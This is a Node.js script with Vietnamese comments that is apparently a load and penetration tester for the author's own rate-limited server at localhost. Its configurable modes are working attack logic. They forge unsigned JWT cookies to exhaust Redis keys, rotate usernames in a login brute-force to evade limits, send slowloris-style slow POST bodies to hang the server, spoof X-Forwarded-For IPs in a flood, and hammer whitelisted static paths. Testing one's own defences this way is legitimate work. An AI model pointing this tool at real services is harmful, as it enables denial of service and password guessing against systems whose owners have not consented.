import http from 'http';
import https from 'https';
import { EventEmitter } from 'events';

// Tối ưu hóa hệ thống listener
EventEmitter.defaultMaxListeners = 0;

// =================================================================
// --- SIÊU CẤU HÌNH (THIẾT LẬP CHIẾN THUẬT) ---
// =================================================================
const CONFIG = {
    url: 'http://localhost:4000',      // Base URL của server
    totalRequests: 30000,              // Tổng số đạn (Nên tăng lên để test Redis Store)
    concurrency: 1000,                  // Số lượng bot bắn cùng lúc

    /**
     * CÁC CHẾ ĐỘ TẤN CÔNG (MODE):
     * 'account_overflow': Giả lập hàng vạn User ID khác nhau qua JWT để chiếm dụng Redis RAM.
     * 'login_storm'     : Tấn công brute-force xoay vòng username để bypass loginLimiter.
     * 'slow_body'       : Gửi POST body siêu chậm (10 byte/s). Treo Node.js Event Loop.
     * 'flood_botnet'    : Kết hợp bắn nhanh (Flood) với đổi IP liên tục (Botnet).
     * 'public_bypass'   : Nhắm vào các folder được whitelist (như /public) để ngốn băng thông.
     */
    mode: 'account_overflow',

    // Cấu hình đường dẫn mục tiêu
    paths: {
        api: '/api/health',
        login: '/api/auth/login',
        public: '/public/static/v1/logo.png'
    },

    bypassCache: true
};

// =================================================================

const stats = {
    success: 0, blocked: 0, error: 0,
    startTime: Date.now(),
    latencies: []
};

let launched = 0;
let completed = 0;

// --- HACKER TOOLKIT ---

const getRandIP = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 255)).join('.');

const getRandUA = () => {
    const uas = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
    ];
    return uas[Math.floor(Math.random() * uas.length)];
};

// Tạo Fake JWT Token để lọt vào logic getUserId của bạn
const generateFakeToken = () => {
    const payload = btoa(JSON.stringify({
        id: `hacker_${Math.random().toString(36).substring(2, 15)}`,
        role: 'user'
    }));
    return `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${payload}.signature_part`;
};

// --- CORE ENGINE ---

const fireShot = () => {
    if (launched >= CONFIG.totalRequests) return;
    launched++;

    const start = Date.now();
    let currentPath = CONFIG.paths.api;
    let method = 'GET';
    let body = null;
    const ip = getRandIP();

    const headers = {
        'X-Forwarded-For': ip,
        'X-Real-IP': ip,
        'User-Agent': getRandUA(),
        'Accept': 'application/json',
        'Cache-Control': 'no-cache'
    };

    // --- LOGIC CHIẾN THUẬT THEO MODE ---
    switch (CONFIG.mode) {
        case 'account_overflow':
            // Ép server nhận diện là User đã Authenticated (Hạn mức 1200 thay vì 200)
            // Đồng thời tạo ra hàng vạn key 'rl:api:user:...' trong Redis
            headers['Cookie'] = `accessToken=${generateFakeToken()}`;
            break;

        case 'login_storm':
            currentPath = CONFIG.paths.login;
            method = 'POST';
            headers['Content-Type'] = 'application/json';
            // Bypass loginLimiter bằng cách thay đổi username liên tục
            body = JSON.stringify({
                username: `target_${Math.random().toString(36).substring(5)}`,
                password: 'wrong_password_but_different_user'
            });
            break;

        case 'slow_body':
            method = 'POST';
            headers['Content-Length'] = '1000';
            break;

        case 'public_bypass':
            currentPath = CONFIG.paths.public; // Đánh vào vùng Whitelist (Skip: true)
            break;
    }

    const targetUrl = new URL(currentPath, CONFIG.url);
    if (CONFIG.bypassCache) targetUrl.searchParams.set('_v', Math.random());

    const client = targetUrl.protocol === 'https:' ? https : http;
    const options = {
        hostname: targetUrl.hostname,
        port: targetUrl.port,
        path: targetUrl.pathname + targetUrl.search,
        method: method,
        headers: headers,
        agent: (CONFIG.mode === 'flood_botnet') ? undefined : false, // False để ép tạo TCP Handshake mới
        timeout: 15000
    };

    const req = client.request(options, (res) => {
        if (CONFIG.mode === 'slow_body') {
            res.on('data', () => { }); // Giữ socket
        } else {
            res.resume();
        }

        res.on('end', () => {
            if (res.statusCode === 200) stats.success++;
            else if (res.statusCode === 429) stats.blocked++;
            stats.latencies.push(Date.now() - start);
            finishRequest();
        });
    });

    // Xử lý gửi Body
    if (CONFIG.mode === 'slow_body') {
        let sent = 0;
        const timer = setInterval(() => {
            if (sent < 1000) {
                req.write("a");
                sent++;
            } else {
                clearInterval(timer);
                req.end();
            }
        }, 100); // Gửi cực chậm để treo worker
    } else if (body) {
        req.write(body);
        req.end();
    } else {
        req.end();
    }

    req.on('error', () => { stats.error++; finishRequest(); });
    req.on('timeout', () => { req.destroy(); stats.error++; finishRequest(); });
};

const finishRequest = () => {
    completed++;
    if (launched < CONFIG.totalRequests) {
        // Thêm jitter cho mode stealth nếu cần, mặc định bắn ngay
        const delay = (CONFIG.mode === 'stealth') ? Math.random() * 500 : 0;
        setTimeout(fireShot, delay);
    }
};

// --- BÁO CÁO ---

const printReport = () => {
    const duration = (Date.now() - stats.startTime) / 1000;
    const sortedLat = stats.latencies.sort((a, b) => a - b);
    const p95 = sortedLat[Math.floor(sortedLat.length * 0.95)] || 0;

    console.log('\n\x1b[35m%s\x1b[0m', '================================================');
    console.log(`   🚀 CHIẾN DỊCH HYPERION: ${CONFIG.mode.toUpperCase()} `);
    console.log('\x1b[35m%s\x1b[0m', '================================================');
    console.log(`Throughput  : ${(completed / duration).toFixed(1)} req/s`);
    console.log(`P95 Latency : ${p95}ms`);
    console.log('------------------------------------------------');
    console.log(`✅ 200 OK   : \x1b[32m${stats.success}\x1b[0m`);
    console.log(`🚫 429 Block: \x1b[33m${stats.blocked}\x1b[0m`);
    console.log(`❌ Errors   : \x1b[31m${stats.error}\x1b[0m`);
    console.log('\x1b[35m%s\x1b[0m', '================================================\n');
};

// --- CHẠY ---
console.log(`\x1b[31m[!] KHỞI ĐỘNG HỆ THỐNG PENTEST V4 - MỤC TIÊU: ${CONFIG.url}\x1b[0m`);
stats.startTime = Date.now();

for (let i = 0; i < CONFIG.concurrency; i++) {
    fireShot();
}

const progress = setInterval(() => {
    const pct = ((completed / CONFIG.totalRequests) * 100).toFixed(1);
    process.stdout.write(`\r[Progress] ${pct}% | Done: ${completed} | Active: ${launched - completed} | 200 OK: ${stats.success}`);

    if (completed >= CONFIG.totalRequests) {
        clearInterval(progress);
        printReport();
        process.exit(0);
    }
}, 300);